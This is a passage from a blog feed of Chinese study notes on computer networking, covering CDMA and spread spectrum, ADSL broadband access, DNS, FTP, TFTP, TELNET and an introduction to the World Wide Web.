id="4-5-2-码片序列实现了扩频-xD"><a href="#4-5-2-码片序列实现了扩频-xD" class="headerlink" title="4.5.2 码片序列实现了扩频&#xD;"></a>4.5.2 码片序列实现了扩频&#xD;</h3><p>假定S站要发送信息的数据率为 b bit&#x2F;s。由于每一个比特要转换成 m 个比特的码片，因此 S 站实际上发送的数据率提高到 mb bit&#x2F;s，同时 S 站所占用的频带宽度也提高到原来数值的 m 倍。</p><p>这种通信方式是<strong>扩频</strong>(spread spectrum)通信中的一种。</p><p>扩频通信通常有两大类：</p><ol><li>一种是<strong>直接序列扩频DSSS</strong> (Direct Sequence Spread Spectrum)，如上面讲的使用码片序列就是这一类。</li><li>另一种是<strong>跳频扩频FHSS</strong> (Frequency Hopping Spread Spectrum)。</li></ol><p>CDMA 的重要特点：</p><ol><li>每个站分配的码片序列不仅必须各不相同，并且还必须互相<strong>正交</strong>(orthogonal)。</li><li>在实用的系统中是使用伪随机码序列。</li></ol><h3 id="4-5-3-码片序列的正交关系-xD"><a href="#4-5-3-码片序列的正交关系-xD" class="headerlink" title="4.5.3 码片序列的正交关系 &#xD;"></a>4.5.3 码片序列的正交关系 &#xD;</h3><p>令向量 S 表示站 S 的码片向量，令 T 表示其他任何站的码片向量。</p><p>两个不同站的码片序列正交，就是向量 S 和T 的规格化内积 (inner product) 等于 0：</p><p>$$<br>{S} \times {T} \equiv \frac{1}{m} \sum_{i&#x3D;1}^{m} S_{i} T_{i}&#x3D;0<br>$$</p><p>任何一个码片向量和该码片向量自己的规格化内积都是 1 。</p><p>$$<br>{S} \times {S}&#x3D;\frac{1}{m} \sum_{i&#x3D;1}^{m} S_{i} S_{i}&#x3D;\frac{1}{m} \sum_{i&#x3D;1}^{m} S_{i}^{2}&#x3D;\frac{1}{m} \sum_{i&#x3D;1}^{m}( \pm 1)^{2}&#x3D;1<br>$$</p><p>一个码片向量和该码片反码的向量的规格化内积值是 –1。</p><h3 id="4-5-4-CDMA-的工作原理-xD"><a href="#4-5-4-CDMA-的工作原理-xD" class="headerlink" title="4.5.4 CDMA 的工作原理 &#xD;"></a>4.5.4 CDMA 的工作原理 &#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_PbymdPgNpw.png"></p><hr><h1 id="5-数字传输系统"><a href="#5-数字传输系统" class="headerlink" title="5 数字传输系统"></a>5 数字传输系统</h1><p>在早期电话网中，从市话局到用户电话机的用户线是采用最廉价的双绞线电缆，而长途干线采用的是频分复用 FDM 的模拟传输方式。</p><p>与模拟通信相比，数字通信无论是在传输质量上还是经济上都有明显的优势。</p><p>目前，长途干线大都采用时分复用 PCM 的数字传输方式。脉码调制 PCM 体制最初是为了在电话局之间的中继线上传送多路的电话。</p><hr><h1 id="6-宽带接入技术"><a href="#6-宽带接入技术" class="headerlink" title="6 宽带接入技术"></a>6 宽带接入技术</h1><p>用户要连接到互联网，必须先连接到某个ISP。</p><p>在互联网的发展初期，用户都是<strong>利用电话的用户线</strong>通过调制解调器连接到ISP的，电话用户线接入到互联网的速率最高仅达到56 kbit&#x2F;s。</p><p>美国联邦通信委员会FCC原来认为只要双向速率之和超过200 kbit&#x2F;s 就是宽带。但 2015 年重新定义为：</p><ol><li>宽带下行速率要达到 25 Mbit&#x2F;s</li><li>宽带上行速率要达到 3 Mbit&#x2F;s</li></ol><p>从宽带接入的媒体来看，可以划分为两大类：</p><ol><li>有线宽带接入</li><li>无线宽带接入</li></ol><h2 id="6-1-ADSL-技术"><a href="#6-1-ADSL-技术" class="headerlink" title="6.1 ADSL 技术"></a>6.1 ADSL 技术</h2><p>非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术就是<strong>用数字技术对现有的模拟电话用户线</strong>进行改造，使它能够承载宽带业务。</p><p>标准模拟电话信号的频带被限制在 300~3400 Hz 的范围内，但用户线本身实际可通过的信号频率仍然超过 1 MHz。</p><p>ADSL 技术就把 0~4 kHz 低端频谱留给传统电话使用，而把原来没有被利用的高端频谱留给用户上网使用。DSL 就是数字用户线 (Digital Subscriber Line) 的缩写。</p><h3 id="6-1-1-DSL-的几种类型-xD"><a href="#6-1-1-DSL-的几种类型-xD" class="headerlink" title="6.1.1 DSL 的几种类型 &#xD;"></a>6.1.1 DSL 的几种类型 &#xD;</h3><ul><li>ADSL (Asymmetric Digital Subscriber Line)：非对称数字用户线</li><li>HDSL (High speed DSL)：高速数字用户线</li><li>SDSL (Single-line DSL)：1 对线的数字用户线</li><li>VDSL (Very high speed DSL)：甚高速数字用户线</li><li>DSL (Digital Subscriber Line) ：数字用户线</li><li>RADSL (Rate-Adaptive DSL)：速率自适应 DSL，是 ADSL 的一个子集，可自动调节线路速率）</li></ul><h3 id="6-1-2-ADSL-的传输距离-xD"><a href="#6-1-2-ADSL-的传输距离-xD" class="headerlink" title="6.1.2 ADSL 的传输距离&#xD;"></a>6.1.2 ADSL 的传输距离&#xD;</h3><p>ADSL 的传输距离取决于数据率和用户线的线径（用户线越细，信号传输时的衰减就越大）。</p><p>lDSL 所能得到的最高数据传输速率与实际的用户线上的信噪比密切相关。</p><p>例如：</p><ol><li>0.5 毫米线径的用户线，传输速率为 1.5~2.0 Mbit&#x2F;s 时可传送5.5公里，但当传输速率提高到 6.1 Mbit&#x2F;s 时，传输距离就缩短为 3.7 公里。</li><li>如果把用户线的线径减小到 0.4 毫米，那么在 6.1 Mbit&#x2F;s 的传输速率下就只能传送 2.7 公里。</li></ol><h3 id="6-1-3-ADSL-的特点-xD"><a href="#6-1-3-ADSL-的特点-xD" class="headerlink" title="6.1.3 ADSL 的特点&#xD;"></a>6.1.3 ADSL 的特点&#xD;</h3><p>上行和下行带宽做成不对称的。上行指从用户到 ISP，而下行指从 ISP 到用户。</p><p>ADSL 在用户线（铜线）的两端各安装一个 ADSL 调制解调器。我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。这里的“多音调”就是“多载波”或“多子信道”的意思。</p><h3 id="6-1-4-DMT-技术-xD"><a href="#6-1-4-DMT-技术-xD" class="headerlink" title="6.1.4 DMT 技术&#xD;"></a>6.1.4 DMT 技术&#xD;</h3><p>DMT 调制技术采用频分复用的方法，把 40 kHz 以上一直到 1.1 MHz 的高端频谱划分为许多子信道，其中 25 个子信道用于上行信道，而 249 个子信道用于下行信道。</p><p>每个子信道占据 4 kHz 带宽（严格讲是 4.3125 kHz），并使用不同的载波（即不同的音调）进行数字调制。这种做法相当于在一对用户线上使用许多小的调制解调器并行地传送数据。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_pR2bxfdMRr.png"></p><p>由于用户线的具体条件往往相差很大（距离、线径、受到相邻用户线的干扰程度等都不同），因此 ADSL 采用自适应调制技术使用户线能够传送尽可能高的数据率。</p><p>当 ADSL 启动时，用户线两端的 ADSL 调制解调器就测试可用的频率、各子信道受到的干扰情况，以及在每一个频率上测试信号的传输质量。</p><p>ADSL 不能保证固定的数据率。对于质量很差的用户线甚至无法开通 ADSL。通常下行数据率在32 kbit&#x2F;s到6.4 Mbit&#x2F;s之间，而上行数据率在 32 kbit&#x2F;s 到 640 kbit&#x2F;s 之间。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_7G5yYKVbex.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络第6章：应用层</title>
      <link href="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_YpCRD0k_cE.png"></p><p>每个应用层协议都是为了解决某一类应用问题，而问题的解决又往往是通过位于不同主机中的多个应用进程之间的通信和协同工作来完成的。应用层的具体内容就是规定应用进程在通信时所遵循的协议。</p><p>应用层的许多协议都是基于客户服务器方式。客户(client)和服务器(server)都是指通信中所涉及的两个应用进程。</p><p>客户服务器方式所描述的是进程之间服务和被服务的关系。客户是服务请求方，服务器是服务提供方。 &#x20;</p><h1 id="1-域名系统-DNS"><a href="#1-域名系统-DNS" class="headerlink" title="1 域名系统 DNS"></a>1 域名系统 DNS</h1><h2 id="1-1-域名系统概述"><a href="#1-1-域名系统概述" class="headerlink" title="1.1 域名系统概述"></a>1.1 域名系统概述</h2><p>域名系统 DNS (Domain Name System) ：</p><ol><li>互联网使用的命名系统。</li><li>用来把人们使用的机器名字（域名）转换为 IP 地址。</li><li>为互联网的各种网络应用提供了核心服务。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_1vG5s1-IxM.png"></p><p>互联网的域名系统DNS被设计称为一个联机分布式数据库系统，并采用客户服务器方式。DNS使大部分名字都在本地进行解析，仅少量解析需要在互联网上通信。</p><ul><li>域名到 IP 地址的解析是由若干个域名服务器程序共同完成。</li><li>域名服务器程序在专设的结点上运行，运行该程序的机器称为<strong>域名服务器</strong>。</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_w5a72peOqL.png"></p><p>解析过程如下：当某一个应用进程需要把主机名解析为IP地址时，该应用进程就调用解析程序，并成为DNS的一个客户，把待解析的域名放在DNS的请求报文中，以UDP用户数据报方式发给本地域名服务器（使用UDP是为了较小开销）。</p><p>本地域名服务器在查找域名后，把对应的IP地址放在回答报文中。</p><p>如果本地域名服务器不能回答该请求，则此域名服务器暂时成为DNS中的另一个客户，并向其他域名服务器发出查询请求。</p><h2 id="1-2-互联网的域名结构"><a href="#1-2-互联网的域名结构" class="headerlink" title="1.2 互联网的域名结构"></a>1.2 互联网的域名结构</h2><ul><li>命名方法：层次树状结构方法。</li><li>任何一个连接在互联网上的主机或路由器，都有一个唯一的层次结构的名字，即域名 (domain name)。</li><li>域 (domain)：<ul><li>名字空间中一个可被管理的划分。</li><li>可以划分为子域，而子域还可继续划分为子域的子域，这样就形成了顶级域、二级域、三级域，等等。</li></ul></li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_N51QWJdmfR.png"></p><p><strong>域名结构</strong>：层次结构。由标号 (label) 序列组成，各标号之间用点（.）隔开，各标号分别代表不同级别的域名。</p><p>原先的顶级域名共分为3大类：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_r_SckR_Cax.png"></p><p>在国家顶级域名下注册的二级域名均由该国家自行确定。</p><p>我国把二级域名划分为“类别域名”和“行政区域名”两大类。</p><p>用域名树来表示域名系统最清楚，域名树的树叶就是计算机的名字，它不能再继续往下划分子域了。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_xUuXIfNYgx.png"></p><p>注意：互联网的名字空间是按照机构的组织来划分的，与物理的网络无关，与 IP 地址中的“子网”也没有关系。</p><h2 id="1-3-域名服务器"><a href="#1-3-域名服务器" class="headerlink" title="1.3 域名服务器"></a>1.3 域名服务器</h2><p>实现域名系统使用分布在各地的域名服务器（DNS 服务器）。一个服务器所负责管辖的（或有权限的）范围叫做区 (zone)。</p><p>各单位根据具体情况来划分自己管辖范围的区。但在一个区中的所有节点必须是能够连通的。每一个区设置相应的权限域名服务器，用来保存该区中的所有主机的域名到 IP 地址的映射。</p><blockquote><p>DNS 服务器的管辖范围不是以“域”为单位，而是以“区”为单位。&#x20;</p></blockquote><h3 id="1-3-1-区的不同划分方法举例-xD"><a href="#1-3-1-区的不同划分方法举例-xD" class="headerlink" title="1.3.1 区的不同划分方法举例&#xD;"></a>1.3.1 区的不同划分方法举例&#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_SQ4CpMArGF.png"></p><h3 id="1-3-2-树状结构的-DNS-域名服务器-xD"><a href="#1-3-2-树状结构的-DNS-域名服务器-xD" class="headerlink" title="1.3.2 树状结构的 DNS 域名服务器&#xD;"></a>1.3.2 树状结构的 DNS 域名服务器&#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_cR4sCa29ke.png"></p><p>每个域名服务器都只对域名体系中的一部分进行管辖。</p><h3 id="1-3-3-域名服务器类型-xD"><a href="#1-3-3-域名服务器类型-xD" class="headerlink" title="1.3.3 域名服务器类型&#xD;"></a>1.3.3 域名服务器类型&#xD;</h3><p>根据所起的作用，分为四种类型：</p><ol><li>根域名服务器</li><li>顶级域名服务器</li><li>权限域名服务器</li><li>本地域名服务器</li></ol><h4 id="1-3-3-1-根域名服务器"><a href="#1-3-3-1-根域名服务器" class="headerlink" title="1.3.3.1 根域名服务器"></a>1.3.3.1 根域名服务器</h4><p>根域名服务器是最高层次，最为重要。所有根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址。</p><p>不管是哪一个本地域名服务器，若要对互联网上任何一个域名进行解析，只要自己无法解析，就首先求助于根域名服务器。</p><p>若所有的根域名服务器都瘫痪了，整个互联网中的 DNS 系统就无法工作了。</p><p>全世界的根域名服务器共有 13 套装置，构成 13 组根域名服务器。根域名服务器总共只有 13 个不同 IP 地址的域名，但并非仅由13台机器所组成。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_nX0Q0MPWuQ.png"></p><p>根域名服务器分布在全世界。为了提供更可靠的服务，在每一个地点的根域名服务器往往由多台机器组成。</p><p>根域名服务器采用任播 (anycast) 技术，当DNS 客户向某个根域名服务器发出查询报文时，路由器能找到离这个 DNS 客户最近的一个根域名服务器。</p><blockquote><p><strong>注意</strong>：根域名服务器并不直接把域名转换成 IP 地址（根域名服务器也没有存放这种信息），而是告诉本地域名服务器下一步应当找哪一个顶级域名服务器进行查询。</p></blockquote><h4 id="1-3-3-2-顶级域名服务器"><a href="#1-3-3-2-顶级域名服务器" class="headerlink" title="1.3.3.2 顶级域名服务器"></a>1.3.3.2 顶级域名服务器</h4><p>顶级域名服务器（即 TLD 服务器）负责管理在该顶级域名服务器注册的所有二级域名。</p><p>当收到 DNS 查询请求时，就给出相应的回答（可能是最后的结果，也可能是下一步应当找的域名服务器的 IP 地址）。</p><h4 id="1-3-3-3-权限域名服务器"><a href="#1-3-3-3-权限域名服务器" class="headerlink" title="1.3.3.3 权限域名服务器"></a>1.3.3.3 权限域名服务器</h4><ul><li>负责一个区（zone）的域名服务器。</li></ul><p>当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的 DNS 客户，下一步应当找哪一个权限域名服务器。</p><h4 id="1-3-3-4-本地域名服务器"><a href="#1-3-3-4-本地域名服务器" class="headerlink" title="1.3.3.4 本地域名服务器"></a>1.3.3.4 本地域名服务器</h4><ul><li>非常重要。</li></ul><p>当一个主机发出 DNS 查询请求时，该查询请求报文就发送给本地域名服务器。</p><p>每一个互联网服务提供者 ISP 或一个大学，都可以拥有一个本地域名服务器。当所要查询的主机也属于同一个本地 ISP 时，该本地域名服务器立即就能将所查询的主机名转换为它的 IP 地址，而不需要再去询问其他的域名服务器。</p><p>本地域名服务器有时也称为默认域名服务器。</p><p>DNS 域名服务器都把数据复制到几个域名服务器来保存，其中的一个是主域名服务器，其他的是辅助域名服务器。</p><p>当主域名服务器出故障时，辅助域名服务器可以保证 DNS 的查询工作不会中断。</p><p>主域名服务器定期把数据复制到辅助域名服务器中，而更改数据只能在主域名服务器中进行，保证了数据的一致性。</p><h3 id="1-3-4-域名的解析过程-xD"><a href="#1-3-4-域名的解析过程-xD" class="headerlink" title="1.3.4 域名的解析过程&#xD;"></a>1.3.4 域名的解析过程&#xD;</h3><h4 id="1-3-4-1-递归查询（比较少用）"><a href="#1-3-4-1-递归查询（比较少用）" class="headerlink" title="1.3.4.1 递归查询（比较少用）"></a>1.3.4.1 递归查询（比较少用）</h4><ul><li>通常，主机向本地域名服务器查询时使用。</li><li>若不知道，就以 DNS 客户的身份，向其他根域名服务器继续发出查询请求报文。</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_LujyiSwPnO.png"></p><h4 id="1-3-4-2-迭代查询"><a href="#1-3-4-2-迭代查询" class="headerlink" title="1.3.4.2 迭代查询"></a>1.3.4.2 迭代查询</h4><ul><li>本地域名服务器向根域名服务器查询时使用。</li><li>要么给出所要查询的 IP 地址，要么告诉下一个要查询的域名服务器的 IP 地址。</li><li>本地域名服务器继续后续查询。</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_bUXNUELwba.png"></p><h3 id="1-3-5-高速缓存-xD"><a href="#1-3-5-高速缓存-xD" class="headerlink" title="1.3.5 高速缓存&#xD;"></a>1.3.5 高速缓存&#xD;</h3><p>也称为高速缓存域名服务器，用于存放最近用过的名字以及从何处获得名字映射信息的记录。</p><p><strong>作用</strong>：大大减轻根域名服务器的负荷，使 DNS 查询请求和回答报文的数量大为减少。</p><p>域名服务器应为每项内容设置计时器，并处理超过合理时间的项。</p><p>当权限域名服务器回答一个查询请求时，在响应中指明绑定有效存在的时间值。增加此时间值可减少网络开销，而减少此时间值可提高域名转换的准确性。</p><hr><h1 id="2-文件传送协议"><a href="#2-文件传送协议" class="headerlink" title="2 文件传送协议"></a>2 文件传送协议</h1><h2 id="2-1-FTP概述"><a href="#2-1-FTP概述" class="headerlink" title="2.1 FTP概述"></a>2.1 FTP概述</h2><p>文件传送协议 FTP (File Transfer Protocol) 是互联网上使用得最广泛的文件传送协议。</p><ul><li>提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限。</li><li>屏蔽了各计算机系统的细节，因而适合于在异构网络中任意计算机之间传送文件。</li><li>是文件共享协议的一个大类。</li></ul><h3 id="2-1-1-文件共享协议-xD"><a href="#2-1-1-文件共享协议-xD" class="headerlink" title="2.1.1 文件共享协议&#xD;"></a>2.1.1 文件共享协议&#xD;</h3><p>文件传送协议：FTP（使用TCP）， TFTP（使用UDP） 等。</p><ul><li>复制整个文件。对文件副本进行访问。<ul><li>若要存取一个文件，就必须先获得一个本地文件副本。</li><li>若要修改文件，只能对文件副本进行修改，然后再将修改后的文件副本传回到原节点。</li></ul></li></ul><p>联机访问 (on-line access) 协议：NFS 等。</p><ul><li>允许同时对一个文件进行存取。</li><li>远地共享文件访问，如同对本地文件的访问一样。</li><li>透明存取，不需要对该应用程序作明显的改动。</li><li>由操作系统负责。</li></ul><h2 id="2-2-FTP-的基本工作原理"><a href="#2-2-FTP-的基本工作原理" class="headerlink" title="2.2 FTP 的基本工作原理"></a>2.2 FTP 的基本工作原理</h2><p>网络环境下复制文件的复杂性：</p><ul><li>计算机存储数据的格式不同。</li><li>文件的目录结构和文件命名的规定不同。</li><li>对于相同的文件存取功能，操作系统使用的命令不同。</li><li>访问控制方法不同。</li></ul><p>只提供文件传送的一些基本服务，它使用 TCP 可靠的运输服务。</p><p>主要功能：减少或消除在不同操作系统下处理文件的不兼容性。使用客户服务器方式。</p><p>一个 FTP 服务器进程可同时为多个客户进程提供服务，FTP 的服务器进程由两大部分组成：</p><ol><li>一个主进程，负责接受新的请求；</li><li>若干个从属进程，负责处理单个请求。</li></ol><h3 id="2-2-1-FTP-主进程的工作步骤-xD"><a href="#2-2-1-FTP-主进程的工作步骤-xD" class="headerlink" title="2.2.1 FTP 主进程的工作步骤&#xD;"></a>2.2.1 FTP 主进程的工作步骤&#xD;</h3><ol><li>打开熟知端口（端口号为 21），使客户进程能够连接上。</li><li>等待客户进程发出连接请求。</li><li>启动从属进程来处理客户进程发来的请求。从属进程对客户进程的请求处理完毕后即终止，但从属进程在运行期间根据需要还可能创建其他一些子进程。</li><li>回到等待状态，继续接受其他客户进程发来的请求。主进程与从属进程的处理是并发地进行。</li></ol><blockquote><p>FTP 客户和服务器之间的两个从属进程和两个 TCP 连接，并且FTP 使用两个不同的端口号。</p></blockquote><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_YkBuY7gO-A.png"></p><p>图中服务器有两个从属进程：控制进程和数据传送进程。为简单起见，服务器端的主进程没有画上。</p><p>在进程文件传输时，FTP的客户和服务器之间要建立两个并行的TCP连接：控制连接和数据连接。控制连接在整个会话期间一直保持打开，FTP客户所发出的传送请求，通过控制连接发送给服务器端的控制进程，但控制连接并不用来传送文件。</p><p>由于FTP使用了一个分离的控制连接，因此FTP的控制信息是<strong>带外传送</strong>的。</p><p>lFTP 并非对所有的数据传输都是最佳的：仅能访问副本。</p><h3 id="2-2-2-NFS"><a href="#2-2-2-NFS" class="headerlink" title="2.2.2 NFS"></a>2.2.2 NFS</h3><p>NFS 允许应用进程打开一个远地文件，并能在该文件的某一个特定的位置上开始读写数据。</p><p>NFS 可使用户只复制一个大文件中的一个很小的片段，而不需要复制整个大文件。</p><p>NFS 在网络上传送的只是少量的修改数据。</p><h2 id="2-3-简单文件传送协议-TFTP"><a href="#2-3-简单文件传送协议-TFTP" class="headerlink" title="2.3 简单文件传送协议 TFTP"></a>2.3 简单文件传送协议 TFTP</h2><p>TFTP (Trivial File Transfer Protocol) 是一个很小且易于实现的文件传送协议。使用客户服务器方式和使用 <strong>UDP</strong> 数据报，因此 TFTP 需要<strong>有自己的差错改正措施</strong>。</p><ul><li>只支持文件传输，不支持交互。</li><li>没有庞大的命令集，没有列目录的功能，也不能对用户进行身份鉴别。</li></ul><p>优点：</p><ol><li>可用于 UDP 环境；</li><li>代码所占的内存较小。</li></ol><h3 id="2-3-1-TFTP-的主要特点-xD"><a href="#2-3-1-TFTP-的主要特点-xD" class="headerlink" title="2.3.1 TFTP 的主要特点&#xD;"></a>2.3.1 TFTP 的主要特点&#xD;</h3><ol><li>每次传送的数据报文中有 512 字节的数据，但最后一次可不足 512 字节。</li><li>数据报文按序编号，从 1 开始。</li><li>支持 ASCII 码或二进制传送。</li><li>可对文件进行读或写。</li><li>使用很简单的首部。</li></ol><h3 id="2-3-2-TFTP-的工作很像停止等待协议-xD"><a href="#2-3-2-TFTP-的工作很像停止等待协议-xD" class="headerlink" title="2.3.2 TFTP 的工作很像停止等待协议&#xD;"></a>2.3.2 TFTP 的工作很像停止等待协议&#xD;</h3><p>发送完一个文件块后就等待对方的确认，确认时应指明所确认的块编号。</p><p>发完数据后在规定时间内收不到确认就要重发数据 PDU。</p><p>发送确认 PDU 的一方若在规定时间内未收到下一个文件块，需重发确认 PDU，保证文件的传送不致因某一个数据报的丢失而告失败。</p><h3 id="2-3-3-TFTP-的工作过程-xD"><a href="#2-3-3-TFTP-的工作过程-xD" class="headerlink" title="2.3.3 TFTP 的工作过程&#xD;"></a>2.3.3 TFTP 的工作过程&#xD;</h3><ol><li>开始工作时，TFTP 客户进程发送一个读请求或写请求报文给 TFTP 服务器进程，其 UDP 熟知端口号码为 69。</li><li>TFTP 服务器进程选择一个新的端口和 TFTP 客户进程进行通信。</li><li>若文件长度恰好为 512 字节的整数倍，则在文件传送完毕后，还必须在最后发送一个只含首部而无数据的数据报文。</li><li>若文件长度不是 512 字节的整数倍，则最后传送数据报文的数据字段一定不满 512 字节，作为文件结束的标志。</li></ol><h2 id="2-4-远程终端协议-TELNET"><a href="#2-4-远程终端协议-TELNET" class="headerlink" title="2.4 远程终端协议 TELNET"></a>2.4 远程终端协议 TELNET</h2><p>TELNET是一个简单的远程终端协议，是互联网的正式标准。其允许用户在其所在地通过 <strong>TCP 连接</strong>注册（即登录）到远地的另一个主机上（使用主机名或 IP 地址）。</p><p>能将用户的击键传到远地主机，同时也能将远地主机的输出通过 TCP 连接返回到用户屏幕。服务是透明的，又称为<strong>终端仿真协议</strong>。</p><p>在本地系统运行 TELNET 客户进程，而在远地主机则运行 TELNET 服务器进程。服务器中的主进程等待新的请求，产生从属进程来处理每一个连接。</p><h3 id="2-4-1-TELNET-使用网络虚拟终端-NVT-格式-xD"><a href="#2-4-1-TELNET-使用网络虚拟终端-NVT-格式-xD" class="headerlink" title="2.4.1 TELNET 使用网络虚拟终端 NVT 格式 &#xD;"></a>2.4.1 TELNET 使用网络虚拟终端 NVT 格式 &#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_Kd1_Y4AZY1.png"></p><p>TELNET 的选项协商 (Option Negotiation) 使客户和服务器可商定使用更多的终端功能，协商的双方是平等的。</p><h3 id="2-4-2-NVT-（Network-Virtual-Terminal-）格式"><a href="#2-4-2-NVT-（Network-Virtual-Terminal-）格式" class="headerlink" title="2.4.2 NVT （Network Virtual Terminal ）格式"></a>2.4.2 NVT （Network Virtual Terminal ）格式</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_0dd6adHhWA.png"></p><hr><h1 id="3-万维网WWW"><a href="#3-万维网WWW" class="headerlink" title="3 万维网WWW"></a>3 万维网WWW</h1><h2 id="3-1-万维网概述"><a href="#3-1-万维网概述" class="headerlink" title="3.1 万维网概述"></a>3.1 万维网概述</h2><p>万维网 WWW (World Wide Web) 并非某种特殊的计算机网络。万维网是一个大规模的、联机式的信息储藏所。</p><p>万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。这种访问方式称为“链接”。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_qSkYlPju3C.png"></p><h3 id="3-1-1-万维网是分布式超媒体-hypermedia-系统-xD"><a href="#3-1-1-万维网是分布式超媒体-hypermedia-系统-xD" class="headerlink" title="3.1.1 万维网是分布式超媒体 (hypermedia) 系统&#xD;"></a>3.1.1 万维网是分布式超媒体 (hypermedia) 系统&#xD;</h3><p>是超文本 (hypertext) 系统的扩充。</p><ul><li>超文本：由多个信息源链接成。是万维网的基础。</li><li>超媒体与超文本的区别：文档内容不同。</li></ul><p>超文本文档仅包含文本信息。超媒体文档还包含其他信息，如图形、图像、声音、动画，甚至活动视频图像等。</p><p>是一个分布式系统，信息分布在整个互联网上。每台主机上的文档都独立进行管理。</p><h3 id="3-1-2-万维网的工作方式"><a href="#3-1-2-万维网的工作方式" class="headerlink" title="3.1.2 万维网的工作方式"></a>3.1.2 万维网的工作方式</h3><p>以客户服务器方式工作。</p><ul><li>客户程序：浏览器。</li><li>服务器程序：在万维网文档所驻留的主机上运行。这个计算机也称为万维网服务器。</li></ul><p>客户程序向服务器程序发出请求，服务器程序向客户程序送回客户所要的万维网文档。在一个客户程序主窗口上显示出的万维网文档称为页面 (page)。</p><blockquote><p>怎样标志分布在整个互联网上的万维网文档？</p></blockquote><ul><li>使用统一资源定位符 URL (Uniform Resource Locator) 。</li><li>使每一个文档在整个互联网的范围内具有唯一的标识符 URL。</li></ul><blockquote><p>用什么协议来实现万维网上的各种链接？</p></blockquote><ul><li>使用超文本传送协议 HTTP (HyperText Transfer Protocol)。</li><li>HTTP 是一个应用层协议，使用 TCP 